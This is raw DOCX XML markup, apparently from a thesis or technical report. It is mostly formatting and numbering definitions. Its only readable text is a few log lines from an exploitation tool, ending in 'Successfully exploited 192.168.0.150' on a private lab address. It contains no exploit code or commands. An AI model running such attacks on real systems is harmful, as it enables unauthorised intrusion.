          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">DEBUG:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TCPClient</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> close() for 192.168.0.150:65534</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880"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2012-04-05T17:45:30,82Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Closed connection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00CB26A3" w:rsidP="009B2D4D">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2012-04-05T17:45:30,97Z</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Successfully exploited 192.168.0.150</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009B2D4D" w:rsidRPr="00861880" w:rsidRDefault="009B2D4D" w:rsidP="009B2D4D">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="009B2D4D" w:rsidRPr="00861880" w:rsidSect="00161AB6">
      <w:headerReference w:type="default" r:id="rId15"/>
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="144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2F5" w:rsidRDefault="002102F5" w:rsidP="00DA513E">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="002102F5" w:rsidRDefault="002102F5" w:rsidP="00DA5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2F5" w:rsidRDefault="002102F5" w:rsidP="00DA513E">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="002102F5" w:rsidRDefault="002102F5" w:rsidP="00DA51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162122"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Top of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtContent>
      <w:p w:rsidR="002172F1" w:rsidRDefault="009349AB">
        <w:pPr>
          <w:pStyle w:val="Header"/>
          <w:jc w:val="right"/>
        </w:pPr>
        <w:fldSimple w:instr=" PAGE  \* roman  ">
          <w:r w:rsidR="00D143D1">
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <w:t>iii</w:t>
          </w:r>
        </w:fldSimple>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w:rsidR="002172F1" w:rsidRDefault="002172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F1" w:rsidRDefault="002172F1">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:jc w:val="right"/>
    </w:pPr>
  </w:p>
  <w:p w:rsidR="002172F1" w:rsidRDefault="002172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398005"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Top of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtContent>
      <w:p w:rsidR="002172F1" w:rsidRDefault="009349AB">
        <w:pPr>
          <w:pStyle w:val="Header"/>
          <w:jc w:val="right"/>
        </w:pPr>
        <w:fldSimple w:instr=" PAGE  \* roman ">
          <w:r w:rsidR="00D143D1">
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <w:t>vii</w:t>
          </w:r>
        </w:fldSimple>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w:rsidR="002172F1" w:rsidRDefault="002172F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162154"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Top of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtContent>
      <w:p w:rsidR="002172F1" w:rsidRDefault="009349AB">
        <w:pPr>
          <w:pStyle w:val="Header"/>
          <w:jc w:val="right"/>
        </w:pPr>
        <w:fldSimple w:instr=" PAGE  \* Arabic  \* MERGEFORMAT ">
          <w:r w:rsidR="00273B5D">
            <w:rPr>
              <w:noProof/>
            </w:rPr>
            <w:t>55</w:t>
          </w:r>
        </w:fldSimple>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w:rsidR="002172F1" w:rsidRDefault="002172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EB70AA4A">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5880BD80">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="85D239F6">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="22F0CD8A">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="BDA4CC60">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="F35494B8">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="EFE6023E">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="73786234">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="DFD6A462">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E1AE536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8440024C">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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="58169BD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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="40542A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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="FC70F85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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="B4B0645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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C9A4267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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="F484F6D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4"/>
        <w:szCs w:val="24"/>
        <w:u w:val="none"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="313C394A">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AAD2ECB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0E034E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5C96631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CAC764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C4477C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652307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CB002A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1E6C72C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6D62DAB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EFCE3B1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4FA3AA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5EAEC56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4BC3BA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4729BA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F0C844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572EDB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99EE3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054968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887A377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DD36036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EDAE7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FC8EF3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2EC1E3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70E00A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12C663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B126A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DECE1A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06"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000006"/>
    <w:lvl w:ilvl="0" w:tplc="A42EEF1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DEE2063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0CAC16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5BDC7D9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0A8A36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6382B7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ECC46B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922D09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E96DE6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7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000007"/>
    <w:lvl w:ilvl="0" w:tplc="AEA8CEA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B84FE7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E1EC01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1B8641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C50651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B409F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2D6C057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2A854B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C3AB3C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8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000008"/>
    <w:lvl w:ilvl="0" w:tplc="EF74BF1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1" w:tplc="1A14F71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2" w:tplc="52BE9A8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shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="B99AD88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4" w:tplc="42ECE72E">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5" w:tplc="6EC02CE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shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="10889F32">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7" w:tplc="F0602864">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8" w:tplc="043CC47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shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8">
    <w:nsid w:val="00000009"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000009"/>
    <w:lvl w:ilvl="0" w:tplc="87425D5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00D410F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3CAAB35A">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10C2E1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47AE1DE">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9B6C00C4">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0789A88">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E1E21C2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6E6CC3D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0A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000A"/>
    <w:lvl w:ilvl="0" w:tplc="AB405BA8">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7D4BD6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3FAB614">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70291EC">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F462C36">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928684B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57AFEE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B9CE71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D685FA2">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0B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000B"/>
    <w:lvl w:ilvl="0" w:tplc="35C8C03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3BE8C76">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A883F0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37CF20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06A5AD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7DEE9B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77420B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BB0BBA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83EC51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0C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000C"/>
    <w:lvl w:ilvl="0" w:tplc="4B2AF3E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56CE8D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98FC7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9889F1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7C8020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7ECBDA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74E854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43E29BC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EB4729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0D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000D"/>
    <w:lvl w:ilvl="0" w:tplc="27623072">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A9C4010">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FE6171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0EC64C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9678F01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9A437FA">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C1C996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A2A696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6DC153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981AA4F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0B6EE24E">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B74BAE6">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98707008">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4E877A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906782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1CE5B0A">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19C9F5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D4ECFB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4">
    <w:nsid w:val="0000000F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0000000F"/>
    <w:lvl w:ilvl="0" w:tplc="AF8AD8E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2CC18F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3752BFA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6EF2A7F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B6EE98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12285E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59824A8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5B02BFE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CA090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705712B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7574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AC744D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1CBEF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3561F2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="89D4F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B87545"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4944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E91F0D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7F4E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F32C40"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="394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970C28"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="94B2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1700B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="02B8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322A1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4AC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8809AB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AECA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CE0D98"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4384A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692E50"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C76C0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5633F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BE86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77641"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B8CA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1452FA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F33013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56A8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8022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460EB5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EF72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FF539C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B6EE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3C18B2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2DC8C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F6FDA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="813C6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8"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="33"/>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drawingGridHorizontalSpacing w:val="110"/>
  <w:displayHorizontalDrawingGridEvery w:val="2"/>
  <w:noPunctuationKerning/>
  <w:characterSpacingControl w:val="doNotCompress"/>
  <w:hdrShapeDefaults>
    <o:shapedefaults v:ext="edit" spidmax="13314"/>
  </w:hdrShapeDefaults>
  <w:footnotePr>
    <w:footnote w:id="-1"/>
    <w:footnote w:id="0"/>
  </w:footnotePr>
  <w:endnotePr>
    <w:endnote w:id="-1"/>
    <w:endnote w:id="0"/>
  </w:endnotePr>
  <w:compat/>
  <w:rsids>
    <w:rsidRoot w:val="00A77B3E"/>
    <w:rsid w:val="00003563"/>
    <w:rsid w:val="0000381A"/>
    <w:rsid w:val="00007423"/>
    <w:rsid w:val="00007C53"/>
    <w:rsid w:val="0001453E"/>
    <w:rsid w:val="000150D5"/>
    <w:rsid w:val="00015EB8"/>
    <w:rsid w:val="00020E41"/>
    <w:rsid w:val="00022F77"/>
    <w:rsid w:val="00022FDF"/>
    <w:rsid w:val="00030093"/>
    <w:rsid w:val="00047621"/>
    <w:rsid w:val="00056594"/>
    <w:rsid w:val="00057F57"/>
    <w:rsid w:val="00061BBD"/>
    <w:rsid w:val="00070774"/>
    <w:rsid w:val="00075821"/>
    <w:rsid w:val="00077CFA"/>
    <w:rsid w:val="00086C20"/>
    <w:rsid w:val="00091B60"/>
    <w:rsid w:val="000A0AB1"/>
    <w:rsid w:val="000A392B"/>
    <w:rsid w:val="000A4F9F"/>
    <w:rsid w:val="000B23F7"/>
    <w:rsid w:val="000B4679"/>
    <w:rsid w:val="000C356B"/>
    <w:rsid w:val="000C5666"/>
    <w:rsid w:val="000C5C31"/>
    <w:rsid w:val="000C6EEA"/>
    <w:rsid w:val="000D2C70"/>
    <w:rsid w:val="000D3794"/>
    <w:rsid w:val="000D66CD"/>
    <w:rsid w:val="000E3C42"/>
    <w:rsid w:val="000F0635"/>
    <w:rsid w:val="001001F0"/>
    <w:rsid w:val="0010043E"/>
    <w:rsid w:val="00105AA2"/>
    <w:rsid w:val="001107EB"/>
    <w:rsid w:val="0011314C"/>
    <w:rsid w:val="00143A68"/>
    <w:rsid w:val="00151063"/>
    <w:rsid w:val="001539EB"/>
    <w:rsid w:val="00161AB6"/>
    <w:rsid w:val="00161B7D"/>
    <w:rsid w:val="00162D7C"/>
    <w:rsid w:val="001630B7"/>
    <w:rsid w:val="00171ECC"/>
    <w:rsid w:val="00172827"/>
    <w:rsid w:val="00172E51"/>
    <w:rsid w:val="00177142"/>
    <w:rsid w:val="001805FA"/>
    <w:rsid w:val="001849E7"/>
    <w:rsid w:val="00196115"/>
    <w:rsid w:val="001A326F"/>
    <w:rsid w:val="001B19EC"/>
    <w:rsid w:val="001C1CC3"/>
    <w:rsid w:val="001C2BD0"/>
    <w:rsid w:val="001C39DD"/>
    <w:rsid w:val="001C6E4D"/>
    <w:rsid w:val="001D02FA"/>
    <w:rsid w:val="001D206B"/>
    <w:rsid w:val="001D3318"/>
    <w:rsid w:val="001D6396"/>
    <w:rsid w:val="001E006E"/>
    <w:rsid w:val="001E5B27"/>
    <w:rsid w:val="001F0FB4"/>
    <w:rsid w:val="001F7C7C"/>
    <w:rsid w:val="00203E55"/>
    <w:rsid w:val="0020651C"/>
    <w:rsid w:val="002102F5"/>
    <w:rsid w:val="00214BCE"/>
    <w:rsid w:val="002172F1"/>
    <w:rsid w:val="00224144"/>
    <w:rsid w:val="00227781"/>
    <w:rsid w:val="002426DA"/>
    <w:rsid w:val="00242C48"/>
    <w:rsid w:val="002456E3"/>
    <w:rsid w:val="0025001B"/>
    <w:rsid w:val="00254572"/>
    <w:rsid w:val="00256200"/>
    <w:rsid w:val="0026477B"/>
    <w:rsid w:val="002721DA"/>
    <w:rsid w:val="00273819"/>
    <w:rsid w:val="00273B5D"/>
    <w:rsid w:val="00281D14"/>
    <w:rsid w:val="002858B8"/>
    <w:rsid w:val="00290197"/>
    <w:rsid w:val="0029166E"/>
    <w:rsid w:val="002B13F7"/>
    <w:rsid w:val="002B74E5"/>
    <w:rsid w:val="002B76E4"/>
    <w:rsid w:val="002C0B71"/>
    <w:rsid w:val="002C6789"/>
    <w:rsid w:val="002D0DDC"/>
    <w:rsid w:val="002D4C28"/>
    <w:rsid w:val="002D7DB0"/>
    <w:rsid w:val="002F1339"/>
    <w:rsid w:val="002F2AFA"/>
    <w:rsid w:val="002F5499"/>
    <w:rsid w:val="002F6770"/>
    <w:rsid w:val="002F6A6D"/>
    <w:rsid w:val="002F78C1"/>
    <w:rsid w:val="00303131"/>
    <w:rsid w:val="00313B98"/>
    <w:rsid w:val="00316AC0"/>
    <w:rsid w:val="00316F10"/>
    <w:rsid w:val="00321C88"/>
    <w:rsid w:val="00323CD9"/>
    <w:rsid w:val="0032739C"/>
    <w:rsid w:val="00332E5B"/>
    <w:rsid w:val="00340A5F"/>
    <w:rsid w:val="0034100F"/>
    <w:rsid w:val="00347202"/>
    <w:rsid w:val="00354BE8"/>
    <w:rsid w:val="0035587C"/>
    <w:rsid w:val="003566D0"/>
    <w:rsid w:val="00356C91"/>
    <w:rsid w:val="00362A30"/>
    <w:rsid w:val="0036425D"/>
    <w:rsid w:val="00365A5F"/>
    <w:rsid w:val="00374D64"/>
    <w:rsid w:val="00380137"/>
    <w:rsid w:val="00381281"/>
    <w:rsid w:val="00394036"/>
    <w:rsid w:val="003A1213"/>
    <w:rsid w:val="003A2DAC"/>
    <w:rsid w:val="003A5C32"/>
    <w:rsid w:val="003B292A"/>
    <w:rsid w:val="003D2C00"/>
    <w:rsid w:val="003D32C8"/>
    <w:rsid w:val="003D427F"/>
    <w:rsid w:val="003D5823"/>
    <w:rsid w:val="003E1306"/>
    <w:rsid w:val="003E650B"/>
    <w:rsid w:val="003E730A"/>
    <w:rsid w:val="003F10ED"/>
    <w:rsid w:val="003F5DD8"/>
    <w:rsid w:val="00400D80"/>
    <w:rsid w:val="00406747"/>
    <w:rsid w:val="00417597"/>
    <w:rsid w:val="00426F89"/>
    <w:rsid w:val="004333BB"/>
    <w:rsid w:val="004355FF"/>
    <w:rsid w:val="00441CA5"/>
    <w:rsid w:val="004529C2"/>
    <w:rsid w:val="00460373"/>
    <w:rsid w:val="00463849"/>
    <w:rsid w:val="00465BD3"/>
    <w:rsid w:val="00465EF6"/>
    <w:rsid w:val="0047337F"/>
    <w:rsid w:val="004758BF"/>
    <w:rsid w:val="00476730"/>
    <w:rsid w:val="004773C1"/>
    <w:rsid w:val="00483469"/>
    <w:rsid w:val="004867A2"/>
    <w:rsid w:val="004922E0"/>
    <w:rsid w:val="00493963"/>
    <w:rsid w:val="004A4D7F"/>
    <w:rsid w:val="004B004A"/>
    <w:rsid w:val="004B314E"/>
    <w:rsid w:val="004C06C5"/>
    <w:rsid w:val="004C70CE"/>
    <w:rsid w:val="004D2F06"/>
    <w:rsid w:val="004E4419"/>
    <w:rsid w:val="004E5BA5"/>
    <w:rsid w:val="004E6165"/>
    <w:rsid w:val="004E6509"/>
    <w:rsid w:val="004F11C6"/>
    <w:rsid w:val="005036D7"/>
    <w:rsid w:val="00511D2E"/>
    <w:rsid w:val="005165FA"/>
    <w:rsid w:val="00517AEA"/>
    <w:rsid w:val="00522134"/>
    <w:rsid w:val="00533849"/>
    <w:rsid w:val="00541870"/>
    <w:rsid w:val="00544CFC"/>
    <w:rsid w:val="0054552C"/>
    <w:rsid w:val="00546B31"/>
    <w:rsid w:val="00553991"/>
    <w:rsid w:val="0055535A"/>
    <w:rsid w:val="0056359E"/>
    <w:rsid w:val="00573F62"/>
    <w:rsid w:val="00574F3E"/>
    <w:rsid w:val="00577DFF"/>
    <w:rsid w:val="00580AFA"/>
    <w:rsid w:val="00582071"/>
    <w:rsid w:val="0058783B"/>
    <w:rsid w:val="0059178C"/>
    <w:rsid w:val="00595620"/>
    <w:rsid w:val="005A3DC2"/>
    <w:rsid w:val="005A7213"/>
    <w:rsid w:val="005B106E"/>
    <w:rsid w:val="005B1300"/>
    <w:rsid w:val="005B332B"/>
    <w:rsid w:val="005B4FF4"/>
    <w:rsid w:val="005B7D0A"/>
    <w:rsid w:val="005C3795"/>
    <w:rsid w:val="005C49F8"/>
    <w:rsid w:val="005D653F"/>
    <w:rsid w:val="005E215D"/>
    <w:rsid w:val="005F00AC"/>
    <w:rsid w:val="005F1E35"/>
    <w:rsid w:val="005F45E4"/>
    <w:rsid w:val="00603F80"/>
    <w:rsid w:val="00604B3E"/>
    <w:rsid w:val="0061234B"/>
    <w:rsid w:val="00614CB3"/>
    <w:rsid w:val="00617E04"/>
    <w:rsid w:val="006231BD"/>
    <w:rsid w:val="0062622E"/>
    <w:rsid w:val="00627E43"/>
    <w:rsid w:val="00632992"/>
    <w:rsid w:val="00632A1F"/>
    <w:rsid w:val="00642815"/>
    <w:rsid w:val="00651298"/>
    <w:rsid w:val="006543C3"/>
    <w:rsid w:val="00656350"/>
    <w:rsid w:val="00671C8B"/>
    <w:rsid w:val="00674FF1"/>
    <w:rsid w:val="006846B2"/>
    <w:rsid w:val="00686CE7"/>
    <w:rsid w:val="00694D17"/>
    <w:rsid w:val="00695A08"/>
    <w:rsid w:val="0069690B"/>
    <w:rsid w:val="006A170E"/>
    <w:rsid w:val="006A25A3"/>
    <w:rsid w:val="006B5F98"/>
    <w:rsid w:val="006B7C41"/>
    <w:rsid w:val="006C0986"/>
    <w:rsid w:val="006C1013"/>
    <w:rsid w:val="006C3DE7"/>
    <w:rsid w:val="006C447D"/>
    <w:rsid w:val="006D7E7D"/>
    <w:rsid w:val="006E2046"/>
    <w:rsid w:val="006E2056"/>
    <w:rsid w:val="006E520D"/>
    <w:rsid w:val="006E6A95"/>
    <w:rsid w:val="006F2255"/>
    <w:rsid w:val="006F27C1"/>
    <w:rsid w:val="006F2C29"/>
    <w:rsid w:val="00706283"/>
    <w:rsid w:val="00721F62"/>
    <w:rsid w:val="00727EB6"/>
    <w:rsid w:val="00731719"/>
    <w:rsid w:val="007360D2"/>
    <w:rsid w:val="007406D1"/>
    <w:rsid w:val="007408ED"/>
    <w:rsid w:val="00747AAF"/>
    <w:rsid w:val="00764BE1"/>
    <w:rsid w:val="00767949"/>
    <w:rsid w:val="007810FD"/>
    <w:rsid w:val="00786AED"/>
    <w:rsid w:val="007914A2"/>
    <w:rsid w:val="007969E5"/>
    <w:rsid w:val="007A6425"/>
    <w:rsid w:val="007B4737"/>
    <w:rsid w:val="007B75E2"/>
    <w:rsid w:val="007C1107"/>
    <w:rsid w:val="007D2B1F"/>
    <w:rsid w:val="007D47CE"/>
    <w:rsid w:val="007E3C10"/>
    <w:rsid w:val="007E4152"/>
    <w:rsid w:val="007F56AD"/>
    <w:rsid w:val="007F71C8"/>
    <w:rsid w:val="00802502"/>
    <w:rsid w:val="00804EDB"/>
    <w:rsid w:val="00820AB4"/>
    <w:rsid w:val="00831300"/>
    <w:rsid w:val="00831EF2"/>
    <w:rsid w:val="0083541E"/>
    <w:rsid w:val="00841D64"/>
    <w:rsid w:val="00842A98"/>
    <w:rsid w:val="00844C7D"/>
    <w:rsid w:val="0085268F"/>
    <w:rsid w:val="00856A1E"/>
    <w:rsid w:val="00857D7F"/>
    <w:rsid w:val="00861880"/>
    <w:rsid w:val="00864072"/>
    <w:rsid w:val="008756D0"/>
    <w:rsid w:val="00883E9A"/>
    <w:rsid w:val="00887188"/>
    <w:rsid w:val="0088724B"/>
    <w:rsid w:val="0089091D"/>
    <w:rsid w:val="0089241F"/>
    <w:rsid w:val="0089489C"/>
    <w:rsid w:val="008B2E2F"/>
    <w:rsid w:val="008B4AF9"/>
    <w:rsid w:val="008C19EF"/>
    <w:rsid w:val="008C3570"/>
    <w:rsid w:val="008C5950"/>
    <w:rsid w:val="008C5D8C"/>
    <w:rsid w:val="008D2CB2"/>
    <w:rsid w:val="008D466F"/>
    <w:rsid w:val="008D6149"/>
    <w:rsid w:val="008E37BA"/>
    <w:rsid w:val="008E45CF"/>
    <w:rsid w:val="008F0D19"/>
    <w:rsid w:val="008F1155"/>
    <w:rsid w:val="008F5D03"/>
    <w:rsid w:val="008F745A"/>
    <w:rsid w:val="0090334C"/>
    <w:rsid w:val="009045FA"/>
    <w:rsid w:val="009119AC"/>
    <w:rsid w:val="00914BF0"/>
    <w:rsid w:val="00925F30"/>
    <w:rsid w:val="009269F9"/>
    <w:rsid w:val="009279D5"/>
    <w:rsid w:val="00930111"/>
    <w:rsid w:val="009349AB"/>
    <w:rsid w:val="00947144"/>
    <w:rsid w:val="00951C11"/>
    <w:rsid w:val="00951F95"/>
    <w:rsid w:val="009524A3"/>
    <w:rsid w:val="00954CD2"/>
    <w:rsid w:val="00955B9E"/>
    <w:rsid w:val="00963D37"/>
    <w:rsid w:val="00971648"/>
    <w:rsid w:val="00974D51"/>
    <w:rsid w:val="00984EF2"/>
    <w:rsid w:val="009855FD"/>
    <w:rsid w:val="00987FD3"/>
    <w:rsid w:val="009A1A50"/>
    <w:rsid w:val="009A5366"/>
    <w:rsid w:val="009A786A"/>
    <w:rsid w:val="009B2D4D"/>
    <w:rsid w:val="009C533E"/>
    <w:rsid w:val="009C76F1"/>
    <w:rsid w:val="009D0B13"/>
    <w:rsid w:val="009D735A"/>
    <w:rsid w:val="009D766B"/>
    <w:rsid w:val="009E2602"/>
    <w:rsid w:val="009E2943"/>
    <w:rsid w:val="009F045E"/>
    <w:rsid w:val="00A0593B"/>
    <w:rsid w:val="00A13695"/>
    <w:rsid w:val="00A13CD1"/>
    <w:rsid w:val="00A142E8"/>
    <w:rsid w:val="00A15645"/>
    <w:rsid w:val="00A2159F"/>
    <w:rsid w:val="00A311DF"/>
    <w:rsid w:val="00A33874"/>
    <w:rsid w:val="00A353A3"/>
    <w:rsid w:val="00A50F74"/>
    <w:rsid w:val="00A50F90"/>
    <w:rsid w:val="00A61320"/>
    <w:rsid w:val="00A615EF"/>
    <w:rsid w:val="00A62E48"/>
    <w:rsid w:val="00A67E3E"/>
    <w:rsid w:val="00A701FA"/>
    <w:rsid w:val="00A71E7C"/>
    <w:rsid w:val="00A72310"/>
    <w:rsid w:val="00A72706"/>
    <w:rsid w:val="00A75391"/>
    <w:rsid w:val="00A77B3E"/>
    <w:rsid w:val="00A86643"/>
    <w:rsid w:val="00A8797A"/>
    <w:rsid w:val="00A915EE"/>
    <w:rsid w:val="00A932C7"/>
    <w:rsid w:val="00A9337D"/>
    <w:rsid w:val="00A9566F"/>
    <w:rsid w:val="00AA1CEA"/>
    <w:rsid w:val="00AA2C9E"/>
